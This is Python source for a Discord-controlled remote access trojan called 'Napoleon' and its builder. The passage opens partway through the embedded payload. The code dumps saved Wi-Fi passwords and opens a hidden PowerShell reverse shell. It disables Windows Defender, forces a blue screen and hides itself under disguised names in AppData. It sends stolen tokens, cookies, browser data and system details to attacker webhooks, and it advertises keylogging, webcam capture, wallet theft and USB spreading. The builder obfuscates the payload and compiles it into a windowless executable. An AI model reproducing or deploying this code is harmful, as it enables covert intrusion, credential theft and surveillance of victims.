        print(f"Error: {e}")

def Dump_W1F1_Pr0f1l3s(w3bh00k_ur1):
    try:
        profiles = []
        data = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8', errors='ignore')
        for line in data.split('\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                pass_data = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True).decode('utf-8', errors='ignore')
                password = [p.split(":")[1].strip() for p in pass_data.split('\n') if "Key Content" in p][0] if "Key Content" in pass_data else "None"
                profiles.append(f"📶 **{profile}**: `{password}`")

        if not profiles:
            send_embed(w3bh00k_ur1, f'Wi-Fi Dump `{username_pc} "{ip_address_public}"`:', "**No saved Wi-Fi profiles found.**")
        else:
            send_embed(
                w3bh00k_ur1,
                f'Wi-Fi Dump `{username_pc} "{ip_address_public}"`:', 
                "\n".join(profiles) + f"\n\n**Total:** `{len(profiles)}` networks"
            )
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Wi-Fi Dump Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def Blu35cr33n_0f_D34th(w3bh00k_ur1):
    try:
        if sys.platform.startswith("win"):
            import ctypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            send_embed(w3bh00k_ur1, f'BSOD `{username_pc} "{ip_address_public}"`:', "**Blue Screen of Death triggered.**")
        else:
            send_embed(w3bh00k_ur1, f'BSOD `{username_pc} "{ip_address_public}"`:', "**BSOD only supported on Windows.**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'BSOD Error `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

def R3v3rs3_Sh3ll(w3bh00k_ur1, ip, port):
    try:
        subprocess.Popen(f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        send_embed(w3bh00k_ur1, f'Reverse Shell `{username_pc} "{ip_address_public}"`:', f"**Connected to:** ```{ip}:{port}```")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Shell Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def K1ll_4V(w3bh00k_ur1):
    try:
        subprocess.run("powershell -command Stop-Process -Name MsMpEng -Force", shell=True, check=True)
        subprocess.run("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", shell=True)
        send_embed(w3bh00k_ur1, f'AV Killer `{username_pc} "{ip_address_public}"`:', "**Windows Defender disabled.**")
    except subprocess.CalledProcessError as e:
        send_embed(w3bh00k_ur1, f'AV Killer Error `{username_pc} "{ip_address_public}"`:', f"**Error (exit code {e.returncode}):** ```{e.stderr or e.stdout}```")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'AV Killer Error `{username_pc} "{ip_address_public}"`:', f"**Unexpected error:** ```{str(e)}```")
    
def hid3_pr0gr4m():
    number = 0
    file_name = os.path.basename(sys.argv[0])

    if file_name.endswith(".exe"):
        ext = "exe"
    elif file_name.endswith(".py"):
        ext = "py"
    else:
        ext = "None"

    secret_names = ['Defender.exe', "Windows.exe", "Service.exe", 'Defender.py', "Windows.py", "Service.py"]
    path_appdata = [os.path.join(os.getenv('LOCALAPPDATA')), os.path.join(os.getenv('APPDATA'))]

    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in secret_names:
            if proc.info['name'] == file_name:
                number += 1
                if number == 3:
                    sys.exit()
                else:
                    continue
            else:
                sys.exit()
                
            
    if file_name not in secret_names:
        while True:
            file_name_secret = random.choice(secret_names)
            if ext not in file_name_secret: continue
            else: break

        path_name = random.choice(path_appdata) + "\\Windows"

        if not os.path.isdir(path_name):
            os.mkdir(path_name)

        script_path = f"{path_name}\\{file_name_secret}"
        shutil.copy(sys.argv[0], script_path)
            
        if ext == "py":
            os.system(f"python {script_path}")
            sys.exit()
        elif ext == "exe":
            os.system(f"start {script_path}")
            sys.exit()
        else:
            os.system(f"start {script_path}")
            sys.exit()

def NewConnection(w3bh00k_ur1):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)

        embed = discord.Embed(
            title= f'New Connection !',
            description= f"""```
Status    : Connected
Day       : {current_time_day()}
Hour      : {current_time_hour()}
Hostname  : {hostname_pc}
Username  : {username_pc}
Country   : {country}
Ip        : {ip_address_public}
File Name : {file_name}
```""",
            color= color_embed
        )
        client.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    except:
        pass

def HelpCommand(w3bh00k_ur1, prefix):
    commands_group1 = [
        (f"{prefix}help", "Show this help menu."),
        (f"{prefix}system_info", "Steal system information."),
        (f"{prefix}discord_token", "Steal Discord tokens."),
        (f"{prefix}browser_steal", "Steal browser data."),
        (f"{prefix}roblox_cookie", "Steal Roblox cookies."),
        (f"{prefix}camera_capture", "Record webcam."),
        (f"{prefix}microphone_record", "Record microphone (15s)."),
        (f"{prefix}screen_record", "Record screen (15s)."),
        (f"{prefix}clipboard_steal", "Get clipboard content."),
        (f"{prefix}message_box [text]", "Show a message box."),
        (f"{prefix}keylogger [on/off]", "Toggle keylogger."),
        (f"{prefix}location", "Get precise location."),
        (f"{prefix}telegram_steal", "Steal Telegram sessions."),
        (f"{prefix}kill_process [name]", "Force-kill a process."),
        (f"{prefix}self_destruct", "Delete the R4T and exit."),
        (f"{prefix}reverse_shell [ip] [port]", "Hidden CMD access."),
        (f"{prefix}process_hollow [payload_url]", "Inject into explorer.exe."),
        (f"{prefix}bsod", "Trigger a Blue Screen of Death (BSOD)."),
        (f"{prefix}ping", "Check the bot's latency."),
        (f"{prefix}session_list", "List all active sessions."),
        (f"{prefix}screenshot", "Take a screenshot.")
    ]

    commands_group2 = [
        (f"{prefix}file_manager list [path]", "List files in a directory."),
        (f"{prefix}file_manager download [file]", "Download a file."),
        (f"{prefix}file_manager upload [file]", "Upload a file (attach with command)."),
        (f"{prefix}file_manager delete [path]", "Delete a file/folder."),
        (f"{prefix}file_manager rename [old] [new]", "Rename a file/folder."),
        (f"{prefix}restart", "Restart the victim's PC."),
        (f"{prefix}shutdown", "Shut down the victim's PC."),
        (f"{prefix}terminal [cmd]", "Run a command on victim's PC."),
        (f"{prefix}open_url [url]", "Open a URL on victim's PC."),
        (f"{prefix}block_website [url]", "Block a website (Admin required)."),
        (f"{prefix}open_calculator [number]", "Open calculator N times."),
        (f"{prefix}block_task_manager", "Disable Task Manager (Admin)."),
        (f"{prefix}voice [text]", "Speak text aloud on victim's PC."),
        (f"{prefix}disable_firewall", "Disable Windows Firewall."),
        (f"{prefix}kill_av", "Kill Windows Defender."),
        (f"{prefix}steal_crypto", "Steal crypto wallets."),
        (f"{prefix}usb_spread", "Infect USB drives."),
        (f"{prefix}lock [keyboard/mouse/both] [on/off]", "Lock keyboard/mouse input.")
    ]

    def format_commands(commands):
        max_len = max(len(cmd) for cmd, _ in commands)
        lines = [f"`{'Command'.ljust(max_len)} | Description`", f"`{'-'*max_len}-|------------`"]
        for cmd, desc in commands:
            lines.append(f"`{cmd.ljust(max_len)} | {desc}`")
        return "\n".join(lines)

    embed1 = discord.Embed(
        title="📜 Napoleon Commands < 1 >",
        description="**Main Controls**\n\n" + format_commands(commands_group1),
        color=color_embed
    )
    embed1.set_footer(text="Page 1/2  •  " + footer_text, icon_url=avatar_embed)

    embed2 = discord.Embed(
        title="📜 Napoleon Commands < 2 >",
        description="**File & System Controls**\n\n" + format_commands(commands_group2),
        color=color_embed
    )
    embed2.set_footer(text="Page 2/2  •  " + footer_text, icon_url=avatar_embed)

    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed1, username=username_embed, avatar_url=avatar_embed)
    w3bh00k.send(embed=embed2, username=username_embed, avatar_url=avatar_embed)

hid3_pr0gr4m()
try: St4rtup()
except: pass

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

w3bh00k_ur1 = None
prefix = f'{username_pc}/'

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)
Clear()
@bot.event
async def on_ready():
    global w3bh00k_ur1_r4t
    Clear()
    
    guild = bot.get_guild(s3rv3r_id)
    
    if guild:
        category_name = f'C:\\Users\\{username_pc}\\R4t'
        channel_r4t_name = f'🤖・controller'
        channel_ste4ler_name = f'☠️・ste4ler'
        
        existing_category = discord.utils.get(guild.categories, name=category_name)
        
        if not existing_category:
            category = await guild.create_category(category_name)
        else:
            category = existing_category

        existing_channel_ste4ler = discord.utils.get(category.text_channels, name=channel_r4t_name)
        
        if not existing_channel_ste4ler:
            ste4ler_channel = await category.create_text_channel(channel_ste4ler_name)
        else:
            ste4ler_channel = existing_channel_ste4ler      

        webhooks = await ste4ler_channel.webhooks()
        if webhooks:
            w3bh00k_ste4ler = webhooks[0]
            w3bh00k_ur1_ste4ler = w3bh00k_ste4ler.url
        else:
            w3bh00k_ste4ler = await ste4ler_channel.create_webhook(name=f"Napoleon Ste4ler")
            w3bh00k_ur1_ste4ler = w3bh00k_ste4ler.url

            try: Sy5t3m_Inf0(w3bh00k_ur1_ste4ler)
            except: pass
            try: Di5c0rd_T0k3n(w3bh00k_ur1_ste4ler)
            except: pass 
            try: R0b10x_C00ki3(w3bh00k_ur1_ste4ler)
            except: pass
            try: Br0w53r_5t341(w3bh00k_ur1_ste4ler)
            except: pass

        existing_channel_r4t = discord.utils.get(category.text_channels, name=channel_r4t_name)
        
        if not existing_channel_r4t:
            r4t_channel = await category.create_text_channel(channel_r4t_name)
        else:
            r4t_channel = existing_channel_r4t      

        webhooks = await r4t_channel.webhooks()
        if webhooks:
            w3bh00k_r4t = webhooks[0]
        else:
            w3bh00k_r4t = await r4t_channel.create_webhook(name=f"Napoleon")
            HelpCommand(w3bh00k_r4t.url, prefix)
        w3bh00k_ur1_r4t = w3bh00k_r4t.url
        NewConnection(w3bh00k_ur1_r4t)

@bot.command()
async def help(ctx):
    try: HelpCommand(w3bh00k_ur1_r4t, prefix)
    except: pass

@bot.command()
async def system_info(ctx):
    try: Sy5t3m_Inf0(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def bsod(ctx):
    try:
        Blu35cr33n_0f_D34th(w3bh00k_ur1_r4t)
    except Exception as e:
        send_embed(w3bh00k_ur1_r4t, f'BSOD Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

@bot.command()
async def discord_token(ctx):
    try: Di5c0rd_T0k3n(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def session_list(ctx):
    try:
        sessions = []
        for user in bot.users:
            sessions.append(f"👤 `{user.name}{user.discriminator}` | ID: `{user.id}` | Bot: `{user.bot}`")
        if not sessions:
            await ctx.send("No active sessions found.")
        else:
            await ctx.send("**Current Sessions:**\n" + "\n".join(sessions))
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def ping(ctx):
    try:
        latency = bot.latency
        ms = int(latency * 1000)
        await ctx.send(f'🏓 Pong! `{ms}ms`')
    except Exception as e:
        await ctx.send(f"Error: {e}")
    
@bot.command()
async def lock(ctx, lock_type: str, state: str):
    try:
        lock_type = lock_type.lower()
        if lock_type not in ("keyboard", "mouse", "both"):
            send_embed(w3bh00k_ur1_r4t, f'Lock `{username_pc} "{ip_address_public}"`:', "**Invalid lock type. Use `keyboard`, `mouse`, or `both`.**")
            return
        state_bool = state.lower() == "on"
        L0ck_K3yM0u53(w3bh00k_ur1_r4t, lock_type, state_bool)
    except Exception as e:
        send_embed(w3bh00k_ur1_r4t, f'Lock Error `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

@bot.command()
async def reverse_shell(ctx, ip: str, port: int):
    try: R3v3rs3_Sh3ll(w3bh00k_ur1_r4t, ip, port)
    except: pass

@bot.command()
async def update_rat(ctx, url: str):
    try: Upd4t3_R4T(w3bh00k_ur1_r4t, url)
    except: pass

@bot.command()
async def browser_steal(ctx):
    try: Br0w53r_5t341(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def roblox_cookie(ctx):
    try: R0b10x_C00ki3(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def kill_av(ctx):
    try: K1ll_4V(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def camera_capture(ctx):
    try: C4m3r4_C4ptur3(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def usb_spread(ctx):
    try: USB_1nf3ct(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def restart(ctx):
    try: R35t4rt(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def screenshot(ctx):
    try: Scr33n5h0t(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def shutdown(ctx):
    try: Shutd0wn(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def terminal(ctx, *, cmd: str):
    try: T3rmin4l(w3bh00k_ur1_r4t, cmd)
    except: pass

@bot.command()
async def open_url(ctx, *, url: str):
    try: Op3n_Url(w3bh00k_ur1_r4t, url)
    except: pass

@bot.command()
async def steal_wifi(ctx):
    try: St34l_W1F1(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def telegram_steal(ctx):
    try: T3l3gr4m_St34l3r(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def block_website(ctx, *, url: str):
    try: B10ck_W3b5it3(w3bh00k_ur1_r4t, url)
    except: pass

@bot.command()
async def webcam_shot(ctx):
    try: W3bc4m_Sh0t(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def self_destruct(ctx):
    try: S3lf_D3struc7(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def open_calculator(ctx, *, number: str):
    try: Op3n_C4lcul4t0r(w3bh00k_ur1_r4t, number)
    except: pass

@bot.command()
async def block_task_manager(ctx):
    try: B10ck_T45k_M4n4g3r(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def microphone_record(ctx):
    try: M1cr0ph0n3_R3c0rd(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def screen_record(ctx):
    try: Scr33n_R3c0rd(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def clipboard_steal(ctx):
    try: Cl1pb0ard_St34l3r(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def kill_process(ctx, *, process_name: str):
    try: K1ll_Pr0c355(w3bh00k_ur1_r4t, process_name)
    except: pass

@bot.command()
async def steal_crypto(ctx):
    try: St34l_Cr1pt0(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def message_box(ctx, *, text: str):
    try: M3ss4g3_B0x(w3bh00k_ur1_r4t, text)
    except: pass

@bot.command()
async def keylogger(ctx, state: str):
    try: K3yl0gg3r_T0ggl3(w3bh00k_ur1_r4t, state.lower() == "on")
    except: pass

@bot.command()
async def location(ctx):
    try: G3t_L0c4t10n(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def disable_firewall(ctx):
    try: D1s4bl3_F1r3w4ll(w3bh00k_ur1_r4t)
    except: pass

@bot.command()
async def File_Manager(w3bh00k_ur1, action, path=None, new_name=None, file_data=None):
    try:
        if action == "list":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                files.append(f"📄 {item} ({os.path.getsize(item_path) / 1024:.2f} KB)" if os.path.isfile(item_path) else f"📁 {item}")

            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Directory Listing:** ```{path}```\n\n" + "\n".join(files))

        elif action == "download":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**File not found:** ```{path}```")
                return

            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            with open(path, "rb") as f:
                try:
                    w3bh00k.send(
                        embed=Embed(
                            title=f'File Download `{username_pc} "{ip_address_public}"`',
                            description=f"```{path}```",
                            color=color_embed
                        ).set_footer(text=footer_text, icon_url=avatar_embed),
                        file=File(f, filename=os.path.basename(path)),
                        username=username_embed,
                        avatar_url=avatar_embed
                    )
                except Exception as e:
                    send_embed(w3bh00k_ur1, f'File Manager - Download Error `{username_pc} "{ip_address_public}"`:', f"**Error sending file:** ```{e}```")

        elif action == "upload":
            if file_data is None:
                send_embed(w3bh00k_ur1, f'File Manager - Upload Error `{username_pc} "{ip_address_public}"`:', f"**No file attached.**")
                return
            file_path = os.path.join(path, file_data.filename)
            try:
                with open(file_path, "wb") as f:
                    f.write(file_data.file.read())
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Uploaded:** ```{file_path}```")
            except Exception as e:
                send_embed(w3bh00k_ur1, f'File Manager - Upload Error `{username_pc} "{ip_address_public}"`:', f"**Error uploading file:** ```{e}```")

        elif action == "delete":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            if os.path.isfile(path):
                try:
                    os.remove(path)
                except Exception as e:
                    send_embed(w3bh00k_ur1, f'File Manager - Delete Error `{username_pc} "{ip_address_public}"`:', f"**Error deleting file:** ```{e}```")
            else:
                try:
                    shutil.rmtree(path)
                except Exception as e:
                    send_embed(w3bh00k_ur1, f'File Manager - Delete Error `{username_pc} "{ip_address_public}"`:', f"**Error deleting folder:** ```{e}```")
            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Deleted:** ```{path}```")

        elif action == "rename":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            new_path = os.path.join(os.path.dirname(path), new_name)
            try:
                os.rename(path, new_path)
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Renamed:** ```{path} → {new_path}```")
            except Exception as e:
                send_embed(w3bh00k_ur1, f'File Manager - Rename Error `{username_pc} "{ip_address_public}"`:', f"**Error renaming:** ```{e}```")

    except Exception as e:
        send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

@bot.command()
async def voice(ctx, *, text: str):
    try: V0ic3(w3bh00k_ur1_r4t, text)
    except: pass

bot.run(t0k3n_b0t)'''

import os
import sys
import time
import stat
import ctypes
import shutil
import marshal
import colorama
import importlib
import traceback
import subprocess
import tkinter as tk
import random, string
from colorama import Fore
from datetime import datetime
from tkinter import filedialog
import platform
import hashlib
from time import sleep


def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Napoleon')
    elif platform.system() in ['Linux', 'Darwin']:
        os.system('clear')
        sys.stdout.write("\033]0;Napoleon\007")
        sys.stdout.flush()

def getchecksum():
    md5_hash = hashlib.md5()
    try:
        with open(''.join(sys.argv), "rb") as f:
            md5_hash.update(f.read())
        return md5_hash.hexdigest()
    except Exception as e:
        return None

def log_error_to_file(exc_type, exc_value, exc_traceback):
    with open("error_log.txt", "a") as f:
        f.write("".join(traceback.format_exception(exc_type, exc_value, exc_traceback)))

sys.excepthook = log_error_to_file

colorama.init(autoreset=True)

reset = colorama.Fore.RESET
white = colorama.Fore.WHITE

BEFORE = f'{white}[>{reset}'
AFTER = f'{white}]'

INPUT = f'[>]'
INFO = f'[>]'
ERROR = f'[>]'
ADD = f'[>]'
WAIT = f'[>]'

ws = 'https://fakecrime.bio/up40'
github = 'https://github.com/up40-1'
discord = 'https://discord.com/users/1248748238555713641'
telegram = None
by = "up40"

version = "2.5.1"
title = f"Napoleon v{version} - Discord RAT"

build_folder = "Napoleon-Build"
python_folder = os.path.join(build_folder, "Python-File")
executable_folder = os.path.join(build_folder, "Executable-File")
temp_folder = os.path.join(build_folder, "temp")

def obfuscate_with_napoleon(input_py_path, output_py_path):
    def random_var(used_vars, number=10):
        while True:
            rdm_var = ''.join(random.choices(string.ascii_letters, k=number))
            if rdm_var not in used_vars:
                used_vars.add(rdm_var)
                return rdm_var

    def layer_1(script):
        # Fixed: Remove undefined variable references and input() to avoid NameError and RuntimeError
        anti_kids_code = (
            '\ntry:\n    assert True\nexcept:\n'
            '    import sys\n    print("ERROR: The obfuscated code was modified. To avoid reproducing an error, please do not modify the obfuscated code.")\n    sys.exit()\n'
        )
        return anti_kids_code + script

    def layer_2(script, size_1, size_2):
        used_vars = set()
        for _ in range(random.randint(size_1, size_2)):
            var_1 = random_var(used_vars, random.randint(size_1, size_2))
            var_2 = random_var(used_vars, random.randint(size_1, size_2))
            var_3 = random_var(used_vars, random.randint(size_1, size_2))
            var_4 = random_var(used_vars, random.randint(size_1, size_2))
            var_5 = random_var(used_vars, random.randint(size_1, size_2))
            var_6 = random_var(used_vars, random.randint(size_1, size_2))
            script += (
                f'\nclass {var_1}:\n def {var_2}({var_3}):\n  {var_4} = {var_3}\n  {var_5} = {var_4}\n  return {var_5}\n {var_3} = \'{var_6}\'\n {var_5} = {var_2}({var_3})\n{var_1}()\n'
            )
        return script

    def layer_3(script):
        used_vars = set()
        key = random.randint(1, 10)
        var_1 = random_var(used_vars)
        var_2 = random_var(used_vars)
        var_3 = random_var(used_vars)
        obfuscated_script = ''.join((chr(ord(c) + key) for c in script))
        return (
            f'{var_1} = {repr(obfuscated_script)}\n'
            f'{var_3} = {key}\n'
            f'{var_2} = \'\'.join(chr(ord(c) - {var_3}) for c in {var_1})\n'
            f'exec({var_2})'
        )

    def layer_4(script):
        compiled_code = marshal.dumps(compile(script, '<string>', 'exec'))
        return f'_napoleon_ = {repr(compiled_code)}\nexec(napoleon.loads(_napoleon_))'

    def layer_5(script):
        chunks = [script[i:i + 1000] for i in range(0, len(script), 1000)]
        used_vars = set()
        vars = {random_var(used_vars): repr(chunk) for chunk in chunks}
        code_vars = '\n    '.join((f'{k} = {v}' for k, v in vars.items()))
        return (
            f"\nclass Napoleon:\n    {code_vars}\n\nimport marshal as napoleon\nexec(''.join([Napoleon.{', Napoleon.'.join(vars.keys())}]))"
        )

    def obfuscate(script, size_1, size_2):
        script = layer_1(script)
        script = layer_2(script, size_1, size_2)
        script = layer_3(script)
        script = layer_4(script)
        script = layer_5(script)
        return script

    with open(input_py_path, 'r', encoding='utf-8') as f:
        script = f.read()
    script = obfuscate(script, 50, 100)
    with open(output_py_path, 'w', encoding='utf-8') as f:
        f.write(script)

def Title(title_choice):
    if sys.platform.startswith("win"):
        ctypes.windll.kernel32.SetConsoleTitleW(f"{title} | {title_choice}")
    elif sys.platform.startswith("linux"):
        sys.stdout.write(f"\x1b]2;{title} | {title_choice}\x07")

def Clear():
    clear()

def return_to_main_menu():
    print(f"{white}[>] {reset}Returning to the main menu...")
    time.sleep(3)
    main_menu()

def choose_icon():
    try:
        print(f"{white}[>] {reset}Choose an icon:".ljust(25))
        time.sleep(1)

        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        icon_path = filedialog.askopenfilename(
            parent=root,
            title=f"Napoleon - Discord RAT | Choose an icon (.ico)",
            filetypes=[("ICO files", "*.ico")]
        )
        root.destroy()

        if icon_path:
            print(f"{white}[>] {reset}Icon selected: {icon_path}")
        else:
            print(f"{white}[>] {reset}No icon selected.")
    except Exception as e:
        print(f"{white}[>] {reset}Error: {e}".ljust(50))
        icon_path = None
    return icon_path

def print_ascii_and_links():
    print(f"""{white}
         


                                         _   _                   _                  
                                        | \ | |                 | |                 
                                        |  \| | __ _ _ __   ___ | | ___  ___  _ __  
                                        | . ` |/ _` | '_ \ / _ \| |/ _ \/ _ \| '_ \ 
                                        | |\  | (_| | |_) | (_) | |  __/ (_) | | | |
                                        \_| \_/\__,_| .__/ \___/|_|\___|\___/|_| |_|
                                                    | |                             
                                                    |_|                             
                                                                
                        {white}┌──────────────────────────────────────────────────────────────────────────┐{reset}
                        {white}├─ Website  : {ws}                                   │{reset}
                        {white}├─ Discord  : {discord}                │{reset}
                        {white}├─ GitHub   : {github}                                    │{reset}
                        {white}├─ Made by  : {by}                                                         │{reset}
                        {white}├─ Version  : {version}                                                        │{reset}
                        {white}└──────────────────────────────────────────────────────────────────────────┘{reset}
""")

def hide_file(file_path):
    if sys.platform.startswith("win"):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
        except:
            pass

def hide_folder(folder_path):
    if sys.platform.startswith("win"):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(folder_path, 2)
        except Exception as e:
            print(f"{ERROR} Failed to hide folder: {e}")

def Rat_Builder():
    Clear()
    Title("Builder")
    print_ascii_and_links()

    def force_remove(path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            else:
                os.chmod(path, stat.S_IWRITE)
                os.remove(path)
        except Exception as e:
            print(f"{WAIT} Cleanup warning: {e}")

    file_name = input(f"{white}[>] {reset}File Name: ".ljust(25))
    bot_token = input(f"{white}[>] {reset}Bot Token: ".ljust(25))
    server_id = input(f"{white}[>] {reset}Server ID: ".ljust(25))
    icon_path = choose_icon()

    build_folder = "Napoleon-Build"
    temp_folder_obf = os.path.join(build_folder, "temp_obf")
    
    if os.path.exists(build_folder):
        force_remove(build_folder)
    
    os.makedirs(build_folder, exist_ok=True)
    os.makedirs(temp_folder_obf, exist_ok=True)
    
    if sys.platform.startswith("win"):
        hide_folder(temp_folder_obf)

    original_py = os.path.join(temp_folder_obf, f"{file_name}_original.py")
    obfuscated_py = os.path.join(temp_folder_obf, "napoleon_obfuscated.py")

    try:
        with open(original_py, 'w', encoding='utf-8') as f:
            f.write(f't0k3n_b0t = "{bot_token}"\ns3rv3r_id = {server_id}\n{rat_code}')
        
        print(f"{INFO} Obfuscating with Napoleon...")
        obfuscate_with_napoleon(original_py, obfuscated_py)
        hide_file(original_py)
        hide_file(obfuscated_py)

        def get_crypto_paths():
            paths = []
            try:
                import Crypto
                paths.append((os.path.dirname(Crypto.__file__), 'Crypto'))
            except ImportError:
                pass
            
            try:
                import Cryptodome
                paths.append((os.path.dirname(Cryptodome.__file__), 'Cryptodome'))
            except ImportError:
                pass
            
            if not paths:
                print(f"{ERROR} Neither PyCryptodome nor PyCrypto is installed!")
                print(f"{INFO} Please run: pip install pycryptodome")
                raise ImportError("Missing required crypto modules for compilation.")
            
            return paths

        crypto_paths = get_crypto_paths()

        pyinstaller_cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--distpath', build_folder,
            '--workpath', temp_folder_obf,
            '--specpath', temp_folder_obf,
            '--name', file_name,
            *[f'--add-data={src}{os.pathsep}{dst}' for src, dst in crypto_paths],
            obfuscated_py
        ]

        if icon_path:
            pyinstaller_cmd.extend(['--icon', icon_path])
        
        hidden_imports = [
            'GPUtil', 'cv2', 'Crypto.Cipher.AES', 'discord', 'requests', 
            'browser_cookie3', 'pynput.keyboard', 'pynput.mouse', 'PIL.ImageGrab',
            'pyttsx3', 'pyaudio', 'sqlite3', 'win32api', 'platform', 'pyperclip',
            'subprocess', 'screeninfo', 'win32crypt', 'soundfile', 'sounddevice',
            'geopy.geocoders', 'cryptography.hazmat.primitives.ciphers', 
            'discord.ext.commands', 'win32gui', 'win32con', 'winreg'
        ]
        for imp in hidden_imports:
            try:
                importlib.import_module(imp)
                pyinstaller_cmd.extend(['--hidden-import', imp])
            except ImportError:
                print(f"{WAIT} Optional import '{imp}' not found, skipping.")

        print(f"{INFO} Compiling executable... This may take a moment.")
        result = subprocess.run(
            pyinstaller_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8'
        )

        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else "An unknown error occurred during compilation."
            raise RuntimeError(f"PyInstaller failed:\n{error_msg}")

        force_remove(temp_folder_obf)
        for f in os.listdir(build_folder):
            if f.endswith(('.spec', '.log')):
                force_remove(os.path.join(build_folder, f))

        print(f"\n{ADD} Build successful!")
        print(f"{INFO} Output: {Fore.GREEN}{os.path.join(build_folder, f'{file_name}.exe')}{reset}")

    except Exception as e:
        print(f"\n{ERROR} Build failed: {Fore.RED}{e}{reset}")
        if os.path.exists(temp_folder_obf):
            force_remove(temp_folder_obf)

    input(f"\n{WAIT} Press Enter to continue...")
    main_menu()

def main_menu():
    while True:
        Clear()
        Title("Main Menu")
        print_ascii_and_links()

        option_length = 25

        print(f"{white}[>] {reset}1. Builder".ljust(option_length))
        print(f"{white}[>] {reset}2. Quit".ljust(option_length))
        print(f"{white}[>] {reset}Choose an option: ".ljust(option_length), end="")

        choice = input().strip()

        if choice == '1':
            Rat_Builder()
        elif choice == '2':
            print(f"{white}[>] {reset}Exiting...")
            time.sleep(1)
            sys.exit()
        else:
            print(f"{ERROR} Invalid option, please choose 1 or 2.")
            time.sleep(2)

if __name__ == '__main__':
    main_menu()